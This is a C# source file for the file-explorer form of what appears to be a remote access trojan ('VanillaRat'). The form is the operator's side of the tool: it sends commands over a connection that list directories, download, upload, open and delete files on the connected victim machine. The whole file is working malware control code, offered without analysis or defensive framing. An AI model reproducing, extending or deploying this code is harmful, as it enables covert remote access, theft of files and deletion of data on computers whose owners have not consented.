using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VanillaRat.Forms
{
    public partial class FileExplorer : Form
    {
        public FileExplorer()
        {
            InitializeComponent();
        }
        public int ConnectionID { get; set; }
        public string CurDir;       

        private void lbFiles_SelectedIndexChanged_1(object sender, EventArgs e)
        { 
            if (lbFiles.SelectedItems.Count == 0)
                return;
            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
                txtCurrentDirectory.Text = Item.SubItems[0].Text; 
        }

        private void lbFiles_DoubleClick(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count == 0)
                return;
            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
            {
                txtCurrentDirectory.Text = Item.SubItems[0].Text;
                Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetDF{" + txtCurrentDirectory.Text + "}"));
            } else
            {
                Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("TryOpen{" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text + Item.SubItems[1].Text + "}"));
            }
        }

        private void btnGetDirectoryInfo_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetDF{" + txtCurrentDirectory.Text + "}"));
        }

        private void txtCurrentDirectory_TextChanged(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                txtCurrentDirectory.Text = @"C:\";
            CurDir = txtCurrentDirectory.Text;
        }

        private void btnUp_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GoUpDir"));
        }

        private void btnRefresh_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetDF{" + txtCurrentDirectory.Text + "}"));
        }

        private void btnDownloadFile_Click(object sender, EventArgs e)
        {
            if (!Classes.TempDataHelper.CanDownload)
            {
                MessageBox.Show("Error: Can not download multiple files at once.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (txtCurrentDirectory.Text.Length < 3)
                return;
            if (lbFiles.SelectedItems.Count == 0)
            {
                MessageBox.Show("Error: No file selected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
                
            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
                return;
            if (!Directory.Exists(Environment.CurrentDirectory + @"\Downloaded Files"))
                Directory.CreateDirectory(Environment.CurrentDirectory + @"\Downloaded Files");          
            Classes.TempDataHelper.DownloadLocation = Environment.CurrentDirectory + @"\Downloaded Files\" + Item.SubItems[0].Text + Item.SubItems[1].Text;
            var Stream = File.Create(Classes.TempDataHelper.DownloadLocation);
            Stream.Close();
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("GetFile{" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text + Item.SubItems[1].Text + "}"));
            Classes.Server.DFF = new DownloadingFileForm();
            Classes.Server.DFF.Show();
            Classes.Server.DFF.txtDownloadingFile.Text = Item.SubItems[0].Text + Item.SubItems[1].Text;
            Classes.TempDataHelper.CanDownload = false;
        }

        private void btnUpload_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                if (!Classes.TempDataHelper.CanUpload)
                {
                    MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                } else
                {
                    Classes.TempDataHelper.CanUpload = false;
                    string FileString = OFD.FileName;
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                        FS.Close();
                    }
                    Classes.AutoClosingMessageBox.Show("Starting file upload.", "Starting Upload", 1000);
                    Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StartFileReceive{" + txtCurrentDirectory.Text + @"\" + Path.GetFileName(OFD.FileName) + "}"));                   
                    Thread.Sleep(80);
                    Classes.Server.MainServer.Send(ConnectionID, FileBytes);
                    Classes.TempDataHelper.CanUpload = true;
                }
            }
        }

        private void lbFiles_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
            else
                e.Effect = DragDropEffects.None;
        }

        private void lbFiles_DragDrop(object sender, DragEventArgs e)
        {
            int MaximumFiles = 0;
            string[] File = (string[])e.Data.GetData(DataFormats.FileDrop, false);
            foreach (string S in File)
                MaximumFiles++;
            if (MaximumFiles > 1)
            {
                MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            } else
            {
                Classes.TempDataHelper.CanUpload = false;
                string FileString = File[0];
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);
                    FS.Close();
                }
                Classes.AutoClosingMessageBox.Show("Starting file upload.", "Starting Upload", 1000);
                Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("StartFileReceive{" + txtCurrentDirectory.Text + @"\" + Path.GetFileName(File[0]) + "}"));
                Thread.Sleep(80);
                Classes.Server.MainServer.Send(ConnectionID, FileBytes);
                Classes.TempDataHelper.CanUpload = true;
            }

        }

        private void btnDeleteFile_Click(object sender, EventArgs e)
        {
            if (txtCurrentDirectory.Text.Length < 3)
                return;           
            if (lbFiles.SelectedItems.Count == 0)
            {
                MessageBox.Show("Error: No file selected.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            ListViewItem Item = lbFiles.SelectedItems[0];
            if (Item.SubItems[1].Text == "Directory")
                return;
            Classes.Server.MainServer.Send(ConnectionID, Encoding.ASCII.GetBytes("DeleteFile{" + txtCurrentDirectory.Text + @"\" + Item.SubItems[0].Text + Item.SubItems[1].Text + "}"));
        }
    }
}
